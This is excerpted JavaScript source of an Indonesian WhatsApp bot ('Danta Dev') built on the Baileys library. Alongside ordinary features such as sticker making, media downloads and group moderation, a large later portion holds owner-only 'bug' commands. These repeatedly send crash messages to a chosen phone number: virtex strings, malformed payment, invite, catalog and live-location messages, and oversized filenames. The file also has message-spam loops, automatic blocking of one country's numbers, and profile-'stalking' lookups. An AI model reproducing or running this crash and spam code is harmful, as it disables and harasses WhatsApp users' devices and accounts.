...
const { axios, baileys, chalk, cheerio, child_process, crypto, cookie, FormData, fetch, fs, ffmpeg, jsobfus, process, moment, ms, speed, util, ytdl } = modul;
const { exec, spawn, execSync } = child_process
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = baileys
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, AudioMedia, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, reSize, generateProfilePicture } = require('./lib/myfunc')
...
try {
        ...
        const itsMedanta = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        ...
        const Creatordanta = new Date().getTime()
        const dantaBotWA = UltahCreator - Creatordanta
        const kayhari = Math.floor( dantaBotWA / (1000 * 60 * 60 * 24));
        const kayjam = Math.floor( dantaBotWA % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
        const kaymenit = Math.floor( dantaBotWA % (1000 * 60 * 60) / (1000 * 60))
        const kaydetik = Math.floor( dantaBotWA % (1000 * 60) / 1000)
    	...
    	const banUser = await danta.fetchBlocklist()
...
if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(' - 𝐃𝐚𝐧𝐭𝐚 𝐃𝐞𝐯 '), color(`[ PESAN ]`, `${halalu}`), color(`FROM`, `${halalo}`), color(`${pushname}`, `${halali}`), color(`Text :`, `${halala}`), color(`${body}`, `${halale}`))
}
...
if (isCmd && !itsMedanta) antiSpam.addFilter(from)
...
if (m.sender.startsWith('212')) return danta.updateBlockStatus(m.sender, 'block')
if (m.key.remoteJid == 'status@broadcast') return danta.sendReadReceipt(from, m.sender, [m.key.id])

async function senddantaMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await danta.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}

const sendSticker = (pesan) => {
danta.sendImageAsSticker(m.chat, pesan, m, { packname: global.packname, author: global.author })
}

try {
ppuser = await danta.profilePictureUrl(m.sender, 'image')
} catch (err) {
...
const sendvn = (teks) => {
danta.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}
...
danta.sendMessage(m.chat, { text: teks, mentions: [m.sender] }, { quoted: m })
await sleep(500)
...
participant: `0@s.whatsapp.net`, 
...(from ? {
remoteJid: '6281356484612@s.whatsapp.net' } : {}) }, 
message: { 
extendedTextMessage: { 
text: `${m.pushName}`, 
title: `${m.pushName}`, 
...
const reply = (teks) => {
danta.sendMessage(from, { text: teks ,
contextInfo:{
...
"fileName": `Danta Dev${ngazap(prefix)}`,
...
FN:${await danta.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
...
"message": {
"pollCreationMessage": {
"name": `Danta Dev ${virus}${virtex(prefix)}`,
"options": [
	{
...
"optionName": "KATANYA KEBAL"
	...
	{
"optionName": "SALAM DARI DANTA DEV"
	}
],
...
"orderTitle": "Danta Dev${ngazap(prefix)}",
"sellerJid": "6281356484612@s.whatsapp.net",
...
if (command) {
danta.sendPresenceUpdate(jd, from)
...
.on('finish', async () => {
await danta.sendMessage(from, { video: fs.readFileSync(mp4File), caption: mess.succes, gifPlayback: false }, { quoted: m })
...
.on('finish', async () => {
await danta.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
...
const botzdanta = "6281356484612@s.whatsapp.net"
...
𝘚𝘢𝘺𝘢 𝘋𝘢𝘯𝘵𝘢 𝘋𝘦𝘷 𝘠𝘢𝘯𝘨 𝘉𝘪𝘴𝘢 𝘔𝘦𝘮𝘣𝘢𝘯𝘵𝘶 𝘈𝘯𝘥𝘢 𝘔𝘦𝘮𝘣𝘶𝘢𝘵 𝘚𝘵𝘪𝘤𝘬𝘦𝘳, 𝘋𝘰𝘸𝘯𝘭𝘰𝘢𝘥 𝘝𝘪𝘥𝘦𝘰/𝘈𝘶𝘥𝘪𝘰 𝘛𝘪𝘬𝘵𝘰𝘬, 𝘋𝘰𝘸𝘯𝘭𝘰𝘢𝘥 𝘝𝘪𝘥𝘦𝘰/𝘈𝘶𝘥𝘪𝘰 𝘠𝘰𝘶𝘵𝘶𝘣𝘦, 𝘔𝘦𝘮𝘣𝘶𝘢𝘵 𝘓𝘰𝘨𝘰 𝘛𝘦𝘹𝘵 𝘗𝘳𝘰/𝘗𝘩𝘰𝘵𝘰𝘰𝘹𝘺/𝘌𝘱𝘩𝘰𝘵𝘰360, 𝘋𝘢𝘯 𝘓𝘢𝘪𝘯-𝘭𝘢𝘪𝘯.

Nama ${itsMedanta ? 'Owner' : 'User'} : ${pushname}
Nomor ${itsMedanta ? 'Owner' : 'User'} : ${sender.split("@")[0]}
Jumlah User : ${pendaftar.length} User
Status : ${itsMedanta ? 'Owner' : 'User'}
...
𝐃𝐡𝐢𝐧𝐚 𝐎𝐏𝐄𝐍 𝐖𝐀
𝐌𝐲 𝐓𝐞𝐚𝐦 𝐎𝐏𝐄𝐍 𝐖𝐀`,
mentions : [sender, botzdanta, mark],
footer: `Created By @${botzdanta.split("@")[0]}
...
async function sendFile(jid, media, options={}) {
        ...
        return danta.sendMessage(jid, { [type]: file.data, ...options }, { ...options })
      }
...
async function genProfile(danta, m) {
   let font = await Jimp.loadFont('./name.fnt'), 
     mask = await Jimp.read('https://i.imgur.com/552kzaW.png'), 
     welcome = await Jimp.read("https://telegra.ph/file/81260a8b9e8cff26d2b48.jpg"), 
     avatar = await Jimp.read(await danta.profilePictureUrl(m.sender, 'image').catch(() => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')), 
     status = (await danta.fetchStatus(m.sender).catch(console.log) || {}).status?.slice(0, 30) || 'Not Detected' 
...
return danta.relayMessage(progene.key.remoteJid, progene.message, {
messageId: ""
})
}
...
async function replyprem(teks) {
    ...
    return danta.sendButtonText(m.chat, buttons, teks, `Jangan Mau Free Yah :(`, m)
}

if (/hehe/g.test(m.body)) {
let reactionMessage = proto.Message.ReactionMessage.create({ key: m.key, text: "" })
danta.relayMessage(m.chat, { reactionMessage }, { messageId: "ppppp" })
}
...
await danta.sendButtonText(m.chat, buttons, `Auto Download Tiktok

Title : ${atdl.title}`, `Auto Downloader By danta`, ftext)
}
}
...
if (m.isGroup && !m.key.fromMe && !itsMedanta && antilink) {
if (!isBotAdmins) return
if (budy.match(`chat.whatsapp.com`)) {
danta.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
danta.groupParticipantsUpdate(m.chat, [sender], 'remove')
}
}

if (m.isGroup && !m.key.fromMe && !itsMedanta && antiwame) {
if (!isBotAdmins) return
if (budy.match(`wa.me`)) {
danta.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
danta.groupParticipantsUpdate(m.chat, [sender], 'remove')
...
danta.sendMessage(m.chat, { text: sendResponList(m.chat, chath, db_respon_list) }, { quoted: m })
} else {
buff = await getBuffer(get_data_respon.image_url)
danta.sendImage(m.chat, buff, `${get_data_respon.response}`, m)
}
}
...
/*if (!isCmd && isAlreadydantaList(chath, dblist)) {
var getkaydata = getDatadantaList(chath, dblist)
if (getkaydata.isImage === false) {
danta.sendMessage(m.chat, { text: senddantaList(chath, dblist) }, { quoted: m })
} else {
buff = await getBuffer(getkaydata.image_url)
danta.sendImage(m.chat, buff, `${getkaydata.response}`, m)
}*/
...
case 'listjadibot': 
try {
let user = [... new Set([...global.conns.filter(danta => danta.user).map(danta => danta.user)])]
te = "*List Jadibot*\n\n"
for (let i of user){
y = await danta.decodeJid(i.id)
te += " × User : @" + y.split("@")[0] + "\n"
te += " × Name : " + i.name + "\n\n"
}
danta.sendMessage(from,{text:te,mentions: [y], },{quoted:m})
} catch (err) {
reply(`Belum Ada User Yang Jadibot`)
}
break
case 'shutdown':
if (!itsMedanta) return reply(mess.owner)
reply(`Bye...`)
await sleep(3000)
process.exit()
break
case 'owner': {
const repf = await danta.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Kontak`, 
contacts: list }, mentions: [sender] }, { quoted: m })
danta.sendMessage(from, { text : `Hai Kak @${sender.split("@")[0]}, Nih Owner Ku Jangan Macam-macam Ya`, mentions: [sender]}, { quoted: repf })
}
break
case 'menu':{
const tyds = await danta.sendMessage(from, buttonLocnya, { quoted : m })
danta.sendMessage(from, listMenuMessage, { quoted: tyds })
}
break
case 'allmenu':
senddantaMessage(from, { 
...
"mediaType": 1, 
"thumbnail": ppnyauser,
"mediaUrl": 'https://telegra.ph/file/87d40493317dab876cfb3.jpg',
"sourceUrl": 'https://telegra.ph/file/87d40493317dab876cfb3.jpg'
}
}
})
break
...
setTimeout(() => {
danta.sendMessage(from, {text: `Nih Kak @${teman.split("@")[0]}`, mentions: [teman]}, { quoted : m })
}, 9000)
break
case 'sc': case 'scriptbot': case 'scbot':{
danta.sendMessage(m.chat,{text:`Mau Script Bot Nya? Silahkan Chat Aja @${creator.split("@")[0]}`,mentions: [creator], },{quoted:m})
}
break
case 'q': case 'quoted': {
...
danta.sendMessage(m.chat,{audio:buff, mimetype: "audio/mp4", ptt:false},{quoted:m})
fs.unlinkSync(rano)
})
})
break
...
aj = await igstalk(`${q}`)
danta.sendMessage(m.chat, { image: { url : aj.profile }, caption: 
`*/ Stalking Instagram \\*
...
danta.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*/ Stalking Github \\*
...
danta.sendMessage(m.chat,{image:krt.result,caption:mess.succes},{quoted:m})
}
break
case 'join': {
if (!itsMedanta) return reply(mess.owner)
...
await danta.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'toonce': { 
if (!quoted) return reply(`Reply Image/Video`)
if (/image/.test(mime)) {
anuan = await danta.downloadAndSaveMediaMessage(quoted)
danta.sendMessage(m.chat, {image: {url:anuan}, caption: `Nih Kak`, fileLength: "99999999", viewOnce : true},{quoted: m })
} else if (/video/.test(mime)) {
anuanuan = await danta.downloadAndSaveMediaMessage(quoted)
danta.sendMessage(m.chat, {video: {url:anuanuan}, caption: `Nih Kak`, fileLength: "99999999", viewOnce : true},{quoted: m })
}
}
break
case 'autodltt':
...
await danta.sendButtonText(m.chat, buttons, `Mode Auto Download Tiktok`, `Pilih On Atau Off`, m)
}
break
case 'autosticker':
if (!itsMedanta) return reply(mess.owner)
...
await danta.sendButtonText(m.chat, buttons, `Mode Autosticker`, `Pilih On Atau Off`, m)
}
break
case 'bc':
if (!itsMedanta) return reply(mess.owner)
...
for (let yoi of anu) {
danta.sendMessage(yoi,{text:`INFORMASI
Buat User Bot
...
break
case 'public': {
if (!itsMedanta) throw mess.owner
danta.public = true
dantabotwhatsapp.reply('*Sukse Change To Public Usage*')
}
break
case 'self': {
if (!itsMedanta) throw mess.owner
danta.public = false
dantabotwhatsapp.reply('*Sukses Change To Self Usage*')
}
break
case 'ban':{
if (!itsMedanta) return reply(mess.owner)
if (!q) return reply(`Penggunaan ${prefix+command} add/del nomor\nContoh ${prefix+command} add/del 628123456789`)
orgnye = q.split("|")[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`
let ceknye = await danta.onWhatsApp(orgnye)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
const isBane = banUser ? banUser.includes(orgnye) : false
if (args[0] === "add") {
if (isBane) return reply('User Sudah Dibanned')
danta.updateBlockStatus(orgnye, 'block')
reply(`Succes Ban`)
} else if (args[0] === "del") {
if (!isBane) return reply('User Tidak Dibanned')
danta.updateBlockStatus(orgnye, 'unblock')
reply(`Succes Unban`)
} else {
reply("Error")
}
...
mentions: await danta.parseMention(teskd),
sections
}
danta.sendMessage(from, listMessage, {quoted:m})
} catch {
...
danta.sendMessage(m.chat, { video : { url: fdy.result.url }, caption: `${mess.succes}` }, { quoted: m })
}
break
case 'hentaivid': {
sbe = await hentaivid()
cejd = sbe[Math.floor(Math.random(), sbe.length)]
danta.sendMessage(m.chat, { video: { url: cejd.video_1 }, 
...
await danta.sendButtonText(num, buttons, `Hi Saya Bot Ada Yang Kirim Pesan Ke Kamu
Seseorang Temanmu
(Pengirim Rahasia)
...
await danta.sendMessage(num, {text:`𝘈𝘯𝘥𝘢 𝘑𝘶𝘨𝘢 𝘉𝘪𝘴𝘢 𝘔𝘦𝘮𝘣𝘢𝘭𝘢𝘴 𝘗𝘦𝘴𝘢𝘯 𝘕𝘺𝘢 𝘋𝘦𝘯𝘨𝘢𝘯 𝘊𝘢𝘳𝘢 𝘔𝘦𝘯𝘨𝘪𝘳𝘪𝘮 𝘗𝘦𝘴𝘢𝘯, 𝘑𝘪𝘬𝘢 𝘈𝘯𝘥𝘢 𝘛𝘪𝘥𝘢𝘬 𝘔𝘢𝘶 𝘔𝘦𝘮𝘣𝘢𝘭𝘢𝘴 𝘕𝘺𝘢 𝘗𝘦𝘯𝘤𝘦𝘵 𝘉𝘶𝘵𝘵𝘰𝘯 𝘽𝙞𝙖𝙧𝙞𝙣 𝘋𝘪 𝘈𝘵𝘢𝘴 𝘠𝘢𝘩 𝘔𝘢𝘬𝘢𝘴𝘪𝘩`}, { quoted : m })
...
break
case 'leave':{
if (m.isGroup && itsMedanta && command == "leave") return danta.groupLeave(from)
...
if (other != "") danta.sendMessage(other, {
text: "Bye..."
})
...
case 'antilink':
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMedanta) return reply(mess.admin)
...
await danta.sendButtonText(m.chat, buttons, `Mode Antilink`, `Pilih On Atau Off`, m)
}
break
case 'antiwame':
if (!m.isGroup) return reply(mess.group)
...
await danta.sendButtonText(m.chat, buttons, `Mode Antiwame`, `Pilih On Atau Off`, m)
}
break
case 'add': {
if (!m.isGroup) return reply(mess.group)
...
await danta.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'closetime':
if (!m.isGroup) return reply(mess.group)
...
danta.groupSettingUpdate(from, 'announcement')
reply(close)
}, timer)
break
case 'opentime':
...
danta.groupSettingUpdate(from, 'not_announcement')
reply(open)
}, timer)
break
case 'kick': {
...
await danta.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'promote': {
if (!m.isGroup) return reply(mess.group)
...
if (!isBotAdmins) return reply(mess.botAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await danta.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'demote': {
if (!m.isGroup) return reply(mess.group)
...
if (!isBotAdmins) return reply(mess.botAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await danta.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'hidetag': {
if (!m.isGroup) return reply(mess.group)
...
danta.sendMessage(m.chat,{video:{url: res.media[1].url},caption: `${mess.succes}`},{quoted:m})
}
break
case 'tiktokaudio':{
if (!q) return reply(`Link Nya Kak???\nContoh ${prefix+command} https://vm.tiktok.com/ZSRApJY1K/`)
let tytyd = await tiktokdl(q)
danta.sendMessage(m.chat,{audio:{url: tytyd.media[2].url}, mimetype: "audio/mp4", ptt:false},{quoted:m})
}
break
case 'googles': {
...
const sendMsg = await danta.sendMessage(from, buttonNya)
break
case 'play':{
...
owned = '6281356484612@s.whatsapp.net'
ngen = `
Title : ${anu.title}
Ext : Search
ID : ${anu.videoId}
...
danta.sendMessage(m.chat, buttonMessages, { quoted: {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...
danta.sendMessage(from,{image:qrisdonate, caption:`Hai Kak @${sender.split("@")[0]} Mau ${command}?

Bisa Isi Nomor Payment Di Bawah Ya
Gopay : ${gopayno}
Dana : ${danano}
...
title: `LIST SEWABOT`,
rows: [
{title: `1 MINGGU`, rowId: `${prefix}sewa 1minggu`},
{title: `1 BULAN`, rowId: `${prefix}sewa 1bulan`},
{title: `1 TAHUN`, rowId: `${prefix}sewa 1tahun`},
{title: `PERMANENT`, rowId: `${prefix}sewa permanent`},
]
},
{
title: `LIST PREMIUM`,
...
rows: [
{title: `1 MINGGU`, rowId: `${prefix}own 1minggu`},
{title: `1 BULAN`, rowId: `${prefix}own 1bulan`},
{title: `1 TAHUN`, rowId: `${prefix}own 1tahun`},
{title: `PERMANENT`, rowId: `${prefix}own permanent`},
]
}
]
const listSw = { 
...
let ceknya = await danta.onWhatsApp(prrkek)
...
let delb = await danta.downloadAndSaveMediaMessage(quoted)
vnnye.push(q)
...
let ceknye = await danta.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
owner.push(bnnd)
...
case 'listpremium':
teks = '*List Premium*\n\n'
for (let danta of prem) {
teks += `- ${danta}\n`
}
teks += `\n*Total : ${prem.length}*`
danta.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": prem } })
break
case 'setppbot': {
if (!itsMedanta) return reply(mess.owner)
...
var medis = await danta.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `/kay`) {
...
var memeg = await danta.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
reply(`Sukses`)
}
}
...
const sendMsge = await danta.sendMessage(from, listMessageNya)
break
case 'addlist':
if (!itsMedanta) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
...
if (/image/.test(mime)) {
media = await danta.downloadAndSaveMediaMessage(quoted)
...
let encmedia = await danta.sendImageAsSticker(m.chat, await rmbg(media), m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
...
mee = await danta.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
danta.sendMessage(m.chat, {text:mem},{quoted:m})
} catch (err) {
...
try {
if (!isMedia) return reply(`Kirim/Reply Foto/Vi Dengan Caption ${prefix + command}`)
meeh = await danta.downloadAndSaveMediaMessage(quoted)
memh = await uptotelegra(meeh)
gdye = await getBuffer(`https://some-random-api.ml/canvas/${command}?avatar=${memh}`)
danta.sendImageAsSticker(m.chat, gdye, m, { packname: global.packname, author: global.author })
} catch (err) {
reply(`Reply Image Nya Bang`)
}
break
...
mee = await danta.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
danta.sendMessage(m.chat, { audio: { url: mem }, mimetype: 'audio/mp4', ptt:true, mentions:[m.sender]}, { quoted: m })
break
case 'toaudio':
...
mee = await danta.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
danta.sendMessage(m.chat, { audio: { url: mem }, mimetype: 'audio/mp4', ptt:false, mentions:[m.sender]}, { quoted: m })
break
case 'tomp3':
...
mee = await danta.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
danta.sendMessage(m.chat, { document: {url:mem}, mimetype: 'audio/mpeg', fileName: `Convert By ${pushname}.mp3`, jpegThumbnail: ppnyauser, mentions:[sender] }, {quoted:m})
break
case 'smeme':
...
danta.sendImageAsSticker(m.chat, kaytid, m, { packname: global.packname, author: global.author })
break
case 'cekme':
					neme = args.join(" ")
					bet = `${sender}`
...
danta.sendMessage(from, { image: buff, caption: profile, mentions: [bet]},{quoted:m})
break
case 'toimg': {
...
danta.sendMessage(m.chat, { image: buffer, jpegThumbnail: ppnyauser, 
contextInfo: {
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
...
danta.sendMessage(from, { text: `anak ${command} di sini adalah @${org.split('@')[0]}`, mentions: [org] }, { quoted: m })
}
break
case 'goblokcek':
case 'jelekcek':
...
break
case 'obfus':{
if (!q) return reply(`Contoh ${prefix+command} const dandev = require('danz-api')`)
...
break
case 'send':{
if (!q) return reply(`Penggunaan ${prefix+command} 628123456789`)
num = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
jumlah = '30'
for (let i = 0; i < jumlah; i++) {
danta.sendMessage(num,{text:`hai`},{quoted:lep})
await sleep(1000)
}
...
jumlah = '15'
for (let i = 0; i < jumlah; i++) {
danta.sendMessage(`${q}`.split("-").join("").split(" ").join("").replace("+", "")+"@s.whatsapp.net", {sticker: ppnyauser},{quoted: {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
...
if (!itsMedanta) return reply(mess.owner)
if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628123456789`)
danta.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { 
requestPaymentMessage: { 
Message: { 
extendedTextMessage: { 
text: 'Hai Aku Danta', 
...
contextInfo:{
"externalAdReply": {
"title": `Danta Dev ${virus}${virtex(prefix)}`,
"body": `Danta Dev ${virus}${virtex(prefix)}`,
mimetype: 'audio/mpeg', 
caption: `Danta Dev ${ngazap(prefix)}`,
showAdAttribution: true,
...
case 'jagoanneon' : {
if (!itsMedanta) return reply(mess.owner)
danta.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : m.chat, { 
requestPaymentMessage: { 
Message: { 
extendedTextMessage: { 
text: `Danta Dev ${virus}${virtex(prefix)}`, 
currencyCodeIso4217: 'IDR', 
requestFrom: '0@s.whatsapp.net', 
expiryTimestamp: 8000, 
amount: 1, 
...
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: danta.waUploadToServer })
...
"caption": `Danta Dev ${virus}${virtex(prefix)}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
"mtype": "locationMessage"
}
}), { userJid: num, quoted: lep })
danta.relayMessage(num, liveLocation.message, { messageId: liveLocation.key.id })
await sleep(1000)
}
...
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
danta.sendMessage(num, { audio: audionye, mimetype: 'audio/mp4', seconds: 999999999, ptt:true, mentions:[m.sender]}, { quoted: vien })
await sleep(1000)
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
...
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
danta.sendContact(num, owner, lep)
await sleep(1000)
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
...
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
danta.sendMessage(num, { 
document: ppnyauser, 
fileName: `🔥 DANTA DEV ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, 
...
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
danta.sendMessage(num, {sticker: ppnyauser},{ quoted: lep })
await sleep(1000)
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
...
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
sendBugcrash(num, `Danta Dev ${virus}${virtex(prefix)}`, `Danta Dev ${virus}${virtex(prefix)}`, `Danta Dev ${virus}${virtex(prefix)}`, ppnyauser, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
await sleep(1000)
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
...
"url": `https://wa.me/6281356484612`
},
"businessOwnerJid": "6281356484612@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: lep  })
danta.relayMessage(num, catalog.message, { messageId: catalog.key.id })
await sleep(1000)
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
...
danta.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
await sleep(1000)
}
...
danta.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
await sleep(1000)
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
...
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
danta.sendContact(m.chat, owner, lep)
await sleep(1000)
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
...
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
sendBugcrash(m.chat, `Danta Dev ${virus}${virtex(prefix)}`, `Danta Dev ${virus}${virtex(prefix)}`, `Danta Dev ${virus}${virtex(prefix)}`, ppnyauser, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
await sleep(1000)
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
...
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
danta.sendMessage(m.chat, {sticker: ppnyauser},{ quoted: lep })
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
...
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
danta.sendMessage(m.chat, { audio: audionye, mimetype: 'audio/mp4', seconds: 999999999, ptt:true, mentions:[m.sender]}, { quoted: vien })
await sleep(1000)
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
...
let mnm = await danta.groupAcceptInvite(fhehfhe)
...
jumlah = '30'
for (let i = 0; i < jumlah; i++) {
let tosendgc = await danta.groupAcceptInvite(resultny)
danta.sendMessage(tosendgc, {
text: '', 
templateButtons: [
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ urlButton: { displayText: `P`, url: `https://wa.me/`}},
...
case 'spambugvip':{
if (!itsMedanta) return reply(mess.owner)
if (args.length < 1) return reply(`Penggunaan ${prefix+command} nomor|jumlah\nContoh ${prefix+command} 628123456789|5`)
numt = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
jumlah = q.split('|')[1]
let cekno = await danta.onWhatsApp(numt)
if (cekno.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
if (isNaN(jumlah)) return reply(`Harus berupa angka`)
var buginvite = generateWAMessageFromContent(from, { groupInviteMessage: { groupJid: '6281356484612@g.us', inviteCode: 'UkJdqTXupAtmDwo4', inviteExpiration: '1643553084', invitetime: '1643293887000', groupName: `ৡৢ͜͡𝟒𝟎𝟒-Danta ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, thumbnail: ppnyauser, caption: `ৡৢ͜͡𝟒𝟎𝟒-Danta ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, contextInfo: { forwardingScore: 150, isForwarded: true },},},{ quoted: lep })
...
var liveLocation = generateWAMessageFromContent(from,proto.Message.fromObject({ liveLocationMessage: { degreesLatitude: -6.9367014, degreesLongitude: 107.7228574, caption: `ৡৢ͜͡𝟒𝟎𝟒-Danta ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, sequenceNumber: '1657237469254001', jpegThumbnail: messa.imageMessage } }),{ userJid: from, quoted: lep })
for (let i = 0; i < jumlah; i++) {
danta.relayMessage(numt, buginvite.message, { messageId: buginvite.key.id })
danta.relayMessage(numt, { requestPaymentMessage: { Message: { TextMessage: { text: '', currencyCodeIso4217: 'USD', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
